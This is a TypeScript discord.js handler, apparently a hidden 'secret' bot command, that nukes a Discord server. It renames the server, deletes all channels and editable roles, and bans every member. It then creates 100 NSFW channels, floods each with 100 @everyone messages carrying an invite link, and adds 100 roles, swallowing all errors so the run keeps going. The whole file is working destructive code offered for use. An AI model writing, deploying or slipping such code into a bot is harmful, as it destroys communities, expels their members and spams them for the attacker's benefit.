import type { Message, Client } from "discord.js";
import { ChannelType } from "discord.js";

const SPAM_MESSAGE = `# MEMBERTY NUKE HAHA\n@everyone\nhttps://discord.gg/zy5rjBDTyn`;
const SERVER_NAME = "MEMBERTY WAS HERE";
const CHANNEL_NAME = "memverty";
const CHANNEL_TOPIC = "MEMBERTY WAS HERE AND SAY GOODNIGHT";

export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void args;
  void client;

  const guild = message.guild;
  if (!guild) return;

  let status: import("discord.js").Message | null = null;

  const updateStatus = async (text: string) => {
    try {
      if (status) {
        await status.edit(text).catch(() => {});
      } else {
        status = await message.channel.send(text).catch(() => null);
      }
    } catch {
      /* noop */
    }
  };

  await updateStatus("🔥 Firing...");

  // Rename the server + fetch members in parallel
  await Promise.all([
    guild.setName(SERVER_NAME).catch(() => {}),
    guild.members.fetch().catch(() => {}),
  ]);

  // Delete all channels and roles in parallel
  await updateStatus("🔥 Deleting channels & roles...");
  await Promise.all([
    ...guild.channels.cache.map(([, ch]) => ch.delete().catch(() => {})),
    ...guild.roles.cache
      .filter(([, r]) => r.name !== "@everyone" && r.editable)
      .map(([, r]) => r.delete().catch(() => {})),
  ]);

  // Ban all members in parallel
  await updateStatus("🔥 Banning members...");
  await Promise.all(
    guild.members.cache
      .filter(([, m]) => m.id !== client.user?.id)
      .map(([, m]) => m.ban({ reason: "MEMBERTY FIRE" }).catch(() => {})),
  );

  // Create 100 channels in parallel, then spam messages in each
  await updateStatus("🔥 Creating channels & spamming...");
  const channelPromises = Array.from({ length: 100 }, () =>
    guild.channels
      .create({
        name: CHANNEL_NAME,
        type: ChannelType.GuildText,
        nsfw: true,
        topic: CHANNEL_TOPIC,
      })
      .catch(() => null),
  );
  const channels = await Promise.all(channelPromises);

  // Spam all channels in parallel
  await Promise.all(
    channels
      .filter((ch): ch is NonNullable<typeof ch> => ch !== null && ch.isTextBased())
      .map((ch) =>
        Promise.all(
          Array.from({ length: 100 }, () => ch.send(SPAM_MESSAGE).catch(() => {})),
        ),
      ),
  );

  // Create 100 roles in parallel
  await updateStatus("🔥 Creating roles...");
  await Promise.all(
    Array.from({ length: 100 }, () =>
      guild.roles.create({ name: "MEMBERTY", color: "Red" }).catch(() => {}),
    ),
  );

  await updateStatus("✅ Done.");
}
